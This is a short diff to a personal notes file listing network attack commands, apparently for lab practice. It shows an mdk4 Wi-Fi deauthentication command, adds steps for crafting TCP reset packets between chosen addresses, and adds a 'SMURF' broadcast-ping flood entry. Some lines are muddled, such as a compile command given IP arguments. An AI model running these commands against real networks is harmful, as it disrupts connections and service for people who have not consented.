@@ -10,3 +10,11 @@ Dauth Frames :
     sudo mdk4 <interface> d -w <file> -c <channel>
         file = WhiteList MAC address
         channel = channel of the AP (remove -c <channel> for exe on all channel)
+
+crafting packet
+    use g++ -o rst_packet rst_packet.cpp <ipSrc> <ipDst> (use a valid ip address for ipSrc and ipDst)
+    look at if reset packets are detected by the sniffer (RST Flag: ...)
+
+SMURF : attack use ;
+    ping -b <broadcast ip> -c <number of packet> <ip to ping>
+    or just ping <ip>
